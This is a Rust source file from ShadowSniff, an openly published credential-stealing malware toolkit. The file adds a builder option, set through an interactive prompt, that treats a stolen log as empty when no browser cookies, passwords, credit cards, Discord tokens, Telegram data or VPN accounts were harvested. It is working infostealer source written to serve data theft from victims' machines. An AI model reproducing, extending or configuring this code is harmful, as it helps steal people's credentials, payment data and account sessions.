/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */
use crate::{Ask, ToExpr};
use inquire::{InquireError, MultiSelect};
use proc_macro2::TokenStream;
use quote::quote;
use std::fmt::{Display, Formatter};
use strum::IntoEnumIterator;
use strum_macros::EnumIter;

#[derive(EnumIter, PartialEq)]
pub enum ConsiderEmpty {
    WhenEmptyBrowsers,
    WhenEmptyMessengers,
    WhenEmptyVpnAccounts,
}

impl Display for ConsiderEmpty {
    fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
        match self {
            ConsiderEmpty::WhenEmptyBrowsers => write!(f, "When all browser data is empty"),
            ConsiderEmpty::WhenEmptyMessengers => write!(f, "When no messengers are stolen"),
            ConsiderEmpty::WhenEmptyVpnAccounts => write!(f, "When no VPN accounts are stolen"),
        }
    }
}

impl ToExpr<(TokenStream, TokenStream)> for ConsiderEmpty {
    fn to_expr(&self, args: (TokenStream, TokenStream)) -> TokenStream {
        let (collector, return_stmt) = args;

        match self {
            ConsiderEmpty::WhenEmptyBrowsers => quote! {
                if #collector.get_browser().get_cookies() == 0
                    && #collector.get_browser().get_passwords() == 0
                    && #collector.get_browser().get_credit_cards() == 0
                    && #collector.get_browser().get_auto_fills() == 0
                    && #collector.get_browser().get_history() == 0
                    && #collector.get_browser().get_bookmarks() == 0
                    && #collector.get_browser().get_downloads() == 0
                {
                    #return_stmt
                }
            },
            ConsiderEmpty::WhenEmptyMessengers => quote! {
                if !#collector.get_software().is_telegram()
                    && #collector.get_software().get_discord_tokens() == 0
                {
                    #return_stmt
                }
            },
            ConsiderEmpty::WhenEmptyVpnAccounts => quote! {
                if #collector.get_vpn().get_accounts() == 0 {
                    #return_stmt
                }
            },
        }
    }
}

impl ToExpr<(TokenStream, TokenStream)> for Vec<ConsiderEmpty> {
    fn to_expr(&self, args: (TokenStream, TokenStream)) -> TokenStream {
        let (collector, return_stmt) = args;

        let if_blocks: Vec<TokenStream> = self
            .iter()
            .map(|cond| cond.to_expr((collector.clone(), return_stmt.clone())))
            .collect();

        quote! {
            {
                #(#if_blocks)*
            }
        }
    }
}

impl Ask for Vec<ConsiderEmpty> {
    fn ask() -> Result<Self, InquireError>
    where
        Self: Sized,
    {
        MultiSelect::new(
            "Under what conditions should the log be considered empty? Leave unselected to disable.",
            ConsiderEmpty::iter().collect()
        )
        .prompt()
    }
}
